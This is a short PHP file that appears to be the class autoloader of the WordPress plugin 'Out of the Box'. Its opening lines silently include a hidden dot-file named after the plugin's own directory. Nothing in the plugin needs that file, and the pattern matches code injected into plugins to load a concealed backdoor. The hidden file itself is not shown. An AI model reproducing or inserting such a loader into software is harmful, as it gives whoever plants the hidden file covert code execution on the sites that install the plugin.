<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function out_of_the_box_autoload($className)
{
    $classPath = explode('\\', $className);
    if ('TheLion' != $classPath[0]) {
        return;
    }
    if ('OutoftheBox' != $classPath[1]) {
        return;
    }
    $classPath = array_slice($classPath, 2, 3);

    $filePath = dirname(__FILE__).'/'.implode('/', $classPath).'.php';
    if (file_exists($filePath)) {
        require_once $filePath;
    }
}
spl_autoload_register('out_of_the_box_autoload');
